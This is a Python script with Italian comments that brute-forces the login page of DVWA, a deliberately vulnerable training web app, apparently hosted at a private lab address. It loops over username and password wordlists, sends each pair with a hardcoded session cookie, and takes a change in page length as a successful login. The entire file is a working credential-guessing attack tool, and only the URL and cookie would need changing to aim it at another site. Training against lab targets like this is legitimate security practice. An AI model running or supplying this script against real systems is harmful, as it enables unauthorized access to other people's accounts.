import urllib.request
import urllib.parse
import os
import sys

## ARGOMENTI DI DEFAULT
bsHost = "192.168.50.101"
bsUrl = "http://192.168.50.101/dvwa/vulnerabilities/brute/"
bsCookie = "security=high; PHPSESSID=7e37d7afc3ca0ab55d8dd9f0c3759f21"

## Apertura e lettura dei file contenenti usernames e password
if os.path.isfile('/home/kali/Desktop/brute/usernames.txt'):
    with open('/home/kali/Desktop/brute/usernames.txt', 'r') as dict_user_file:
        dict_user = dict_user_file.readlines()

if os.path.isfile('/home/kali/Desktop/brute/password.txt'):
    with open('/home/kali/Desktop/brute/password.txt', 'r') as dict_password_file:
        dict_password = dict_password_file.readlines()

## Creazione dell' header della richiesta
header = {
    'Host': bsHost,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.5',
    'Cookie': bsCookie
}

## Creazione di una funzione che manda una richiesta al target con relativa stampa della lunghezza pagina
def get_res(requrl, header):
    encoded_url = urllib.parse.quote(requrl, safe=':/?=&')
    req = urllib.request.Request(url=encoded_url, headers=header)
    response = urllib.request.urlopen(req)
    the_page = response.read()
    print(len(the_page))
    ## Controllo della lunghezza della pagina
    if len(the_page) != 4575:
        print("Accesso eseguito")
        sys.exit()
    else:
    	print("Accesso non eseguito\n")

## Ciclo for nidificato per provare ogni combinazione di credenziali
for line_usr in dict_user:
    for line_pwd in dict_password:
        requrl = bsUrl + "?username=" + line_usr.strip() + "&password=" + line_pwd.strip() + "&Login=Login"
        print(line_usr.strip(), "--", line_pwd.strip(), "\t")
        get_res(requrl, header)
